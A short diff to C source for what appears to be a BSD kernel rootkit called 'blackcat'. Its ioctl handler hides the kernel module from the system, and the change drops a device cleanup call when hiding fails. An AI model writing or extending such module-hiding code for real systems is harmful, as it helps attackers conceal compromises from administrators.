@@ -47,7 +47,6 @@ int cdev_ioctl(dev_t dev, u_long cmd, void *u_addr, int flag, struct lwp *lp) {
         case BLACKCAT_MODHIDE:
             if ((errno = icloak_ko(CDEVNAME)) != 0) {
                 uprintf("/dev/blackcat: Unable to hide the kernel module.\n");
-                cdev_deinit();
             }
             break;
 
